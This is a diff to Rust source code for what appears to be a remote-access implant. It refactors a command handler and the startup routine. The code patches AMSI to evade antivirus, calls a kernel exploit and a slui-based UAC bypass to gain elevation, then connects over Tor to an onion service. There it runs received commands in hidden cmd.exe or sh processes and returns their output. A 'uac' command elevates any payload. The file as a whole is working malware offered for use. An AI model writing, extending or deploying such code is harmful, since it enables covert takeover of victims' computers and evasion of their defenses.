@@ -3,12 +3,8 @@
 mod uac_bypass;
 #[cfg(target_os = "windows")]
 mod amsi_patch;
-
 #[cfg(target_os = "windows")]
 mod kernel_exploit;
-
-#[cfg(target_os = "windows")]
-mod debug_privileges;
 
 
 
@@ -54,7 +50,7 @@ async fn init_tor() -> Result<TorClient<PreferredRuntime>> {
 }
 
 /// Build prompt string
-fn build_prompt() -> String {
+pub fn build_prompt() -> String {
 
     let user = std::env::var("USER")
         .or_else(|_| std::env::var("USERNAME"))
@@ -72,62 +68,95 @@ fn build_prompt() -> String {
 }
 
 /// Execute a command
-async fn run_command(input: &str) -> Result<Vec<u8>> {
+pub async fn run_command(input: &str) -> Result<Vec<u8>> {
     let mut parts = input.trim().split_whitespace();
 
     let cmd = parts.next().ok_or_else(|| anyhow!("Empty command"))?;
     let args: Vec<&str> = parts.collect();
 
-    if cmd == "cd" {
-        let target = args.get(0).ok_or_else(|| anyhow!("cd: missing argument"))?;
+    match cmd {
+        "cd" => {
+            let target = args.get(0).ok_or_else(|| anyhow!("cd: missing argument"))?;
 
-        match env::set_current_dir(target) {
-            Ok(_) => {
-                let cwd = env::current_dir()?;
-                return Ok(format!("Changed directory to {}\n", cwd.display()).into_bytes());
-            }
-            Err(e) => {
-                return Ok(format!("cd error: {}\n", e).into_bytes());
+            match std::env::set_current_dir(target) {
+                Ok(_) => {
+                    let cwd = std::env::current_dir()?;
+                    Ok(format!("Changed directory to {}\n", cwd.display()).into_bytes())
+                }
+                Err(e) => {
+                    Ok(format!("cd error: {}\n", e).into_bytes())
+                }
             }
         }
+
+        "uac" => {
+            #[cfg(target_os = "windows")]
+            {
+                if args.is_empty() {
+                    return Ok(b"uac: missing argument\n".to_vec());
+                }
+
+                // preserve full command (important)
+                let payload = args.join(" ");
+                crate::uac_bypass::elevate_uac(&payload);
+
+                Ok(format!("Triggered UAC with payload: {}\n", payload).into_bytes())
+            }
+
+            #[cfg(not(target_os = "windows"))]
+            {
+                Ok(b"uac not supported on this OS\n".to_vec())
+            }
+        }
+
+        "exit" | "quit" | "/quit" => {
+            // You can decide behavior here:
+            // Option 1: terminate process
+            std::process::exit(0);
+
+            // Option 2 (if you prefer graceful handling):
+            // return Ok(b"exit\n".to_vec());
+        }
+
+        _ => {
+            // fallback: execute command normally
+
+            #[cfg(target_os = "windows")]
+            let mut command = {
+                let mut c = Command::new("cmd.exe");
+                c.arg("/C")
+                    .arg(input)
+                    .creation_flags(0x08000000);
+                c
+            };
+
+            #[cfg(not(target_os = "windows"))]
+            let mut command = {
+                let mut c = Command::new("/bin/sh");
+                c.arg("-c").arg(input);
+                c
+            };
+
+            let output = command.output().await?;
+
+            let mut result = Vec::new();
+            result.extend_from_slice(&output.stdout);
+            result.extend_from_slice(&output.stderr);
+
+            if result.is_empty() {
+                result.extend_from_slice(b"(no output)\n");
+            }
+
+            if !result.ends_with(b"\n") {
+                result.push(b'\n');
+            }
+
+            Ok(result)
+        }
     }
-
-
-    #[cfg(target_os = "windows")]
-    let mut command = {
-        let mut c = Command::new("cmd.exe");
-        c.arg("/C")
-            .arg(input)
-            .creation_flags(0x08000000);
-        c
-    };
-
-    #[cfg(not(target_os = "windows"))]
-    let mut command = {
-        let mut c = Command::new("/bin/sh");
-        c.arg("-c").arg(input);
-        c
-    };
-
-    let output = command.output().await?;
-
-    let mut result = Vec::new();
-    result.extend_from_slice(&output.stdout);
-    result.extend_from_slice(&output.stderr);
-
-    if result.is_empty() {
-        result.extend_from_slice(b"(no output)\n");
-    }
-
-    if !result.ends_with(b"\n") {
-        result.push(b'\n');
-    }
-
-    Ok(result)
 }
-
 /// Connect to onion service
-async fn connect_onion(
+pub async fn connect_onion(
     tor_client: &TorClient<PreferredRuntime>,
     onion_addr: &str,
     port: u16,
@@ -136,7 +165,7 @@ async fn connect_onion(
 }
 
 /// Session loop
-async fn read_loop(stream: DataStream) -> Result<()> {
+pub async fn read_loop(stream: DataStream) -> Result<()> {
     let (mut reader, mut writer) = split(stream);
 
     let mut buf = [0u8; 4096];
@@ -179,7 +208,7 @@ async fn read_loop(stream: DataStream) -> Result<()> {
 }
 
 /// Core runner (THIS is what you export for lib usage)
-async fn netclient_run(config: ClientConfig) -> Result<()> {
+pub async fn netclient_run(config: ClientConfig) -> Result<()> {
     loop {
         println!("Attempting to connect...");
 
@@ -212,17 +241,23 @@ async fn netclient_run(config: ClientConfig) -> Result<()> {
 pub async fn netclient() -> Result<()> {
     #[cfg(target_os = "windows")]
     amsi_patch::amsi_patch();
+
     #[cfg(target_os = "windows")]
     let exe_path = env::current_exe()?;
+
     #[cfg(target_os = "windows")]
     let exe_str = exe_path.to_string_lossy().to_string();
-    if is_elevated() != true {
-        #[cfg(target_os = "windows")]
-        debug_privileges::enable_debug_privileges();
-        #[cfg(target_os = "windows")]
-        kernel_exploit::kernel_exploit();
-        #[cfg(target_os = "windows")]
-        uac_bypass::elevate_uac(&exe_str);
+
+    #[cfg(target_os = "windows")]
+    if !is_elevated() {
+        //kernel_exploit::kernel_exploit();
+        unsafe {
+            kernel_exploit::exploit();
+        }
+        uac_bypass::uac_slui(&exe_str);
+        // Make sure user session is the last one to connect, elevated prompt will execute first!
+        sleep(Duration::from_secs(61)).await;
+        return Ok(()); // early return = cleaner
     }
     netclient_run(ClientConfig::default()).await
 }
